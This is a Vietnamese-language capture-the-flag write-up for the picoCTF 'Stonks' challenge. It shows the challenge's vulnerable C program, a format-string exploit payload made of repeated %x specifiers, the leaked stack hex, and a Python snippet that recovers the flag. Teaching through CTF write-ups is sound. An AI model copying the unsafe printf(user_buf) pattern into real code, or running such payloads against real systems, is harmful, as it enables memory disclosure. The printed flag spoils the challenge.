## Stonks - 20 points 

## Tóm tắt

+ Bài toán cho chúng ta một file `vuln.c` và một `nc mercury.picoctf.net 16439` để ta tương tác với serve. Nhiệm vụ của chúng ta là nghiên cứu lỗ hỗng trong file này để tìm flag

```cpp

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```

## Lời giải

- Thì sau khi đọc write up trên mạng tại [Link](https://www.youtube.com/watch?v=ctpQdH-GGqY) cùng với sự trợ giúp của `@Mr.Morning` mình đã hiểu được vài điều và viết write up để lưu lại ! 

- Mặc dù đề bài khá dài nhưng lỗ hỗng nó nằm ngay tại: 

```c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

Thì lỗ hỗng ở đây nằm ở hàm `printf(user_buf);`.

Ở đây hàm này printf này không an toàn, lẽ ra nó phải như vầy: `printf("%s",user_buf);`

Nên lợi dụng sơ hở nguy hiểm này: Ta truyền vào một xâu gồm `300` ký tự: `%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x`

Đây chính là lỗ hỗng liên quan đến `format strings`

Khi ta nhập như vầy, thì hàm `printf(user_buf);` sẽ hiểu là `printf('%x %x ... %x',arg1,arg2,...,arg150)`

Và vì nó không có để in ra màn hình hết, nên nó sẽ quét toàn bộ có gì trong stack để in ra màn hình

Khi đó ta được một chuỗi hex như sau:

`9d8e3d0804b00080489c3f7ecdd80ffffffff19d8c160f7edb110f7ecddc709d8d18019d8e3b09d8e3d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ffd7007df7f08af8f7edb440abfed90010f7d6abe9f7edc0c0f7ecd5c0f7ecd000ffd75168f7d5b58df7ecd5c08048ecaffd751740f7eeff09804b000f7ecd000f7ecde20ffd751a8f7ef5d50f7ece890abfed900f7ecd000804b000ffd751a88048c869d8c160ffd75194ffd751a88048be9f7ecd3fc0ffd7525cffd75254119d8c160abfed900ffd751c000f7d10f21f7ecd000f7ecd0000f7d10f211ffd75254ffd7525cffd751e410f7ecd000f7ef070af7f080000f7ecd000005665e5ac5adba3bc000180486300f7ef5d50f7ef0960804b00018048630080486628048b851ffd752548048cd08048d30f7ef0960ffd7524cf7f089401ffd76e7b0ffd76eb4ffd76ec1ffd76ecaffd76ef9ffd76f31ffd76f48ffd76f6bffd76f73020f7ee0b5021f7ee0000101f8bfbff61000116438048034420597f7ee10008098048630b412c412d413e41317`

+ Copy toàn bộ chuỗi nào bỏ vào [tool convert hex into ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html) ta được kết quả như sau:

![Imgur](https://i.imgur.com/vHm2mms.png)

Lúc này ta đã thấy Flag đã dần lộ diện:

`ocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6ÿ× }`

Thì ngẫm nghĩ một chút, ta sẽ thấy, cứ một cụm gồm `4` ký tự kề nhau, đảo ngược lại, ta sẽ thấy được quy luật để tìm được Flag chính xác 

Nên mình đã code một đoạn nhỏ để cho ra flag cuối cùng

```py
u = 'ocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6ÿ× }'
print(len(u))
for _ in range(0,len(u),4):
    print(u[_+3]+u[_+2]+u[_+1]+u[_+0],end='')
```

Và kết quả là:

~~~
picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
~~~



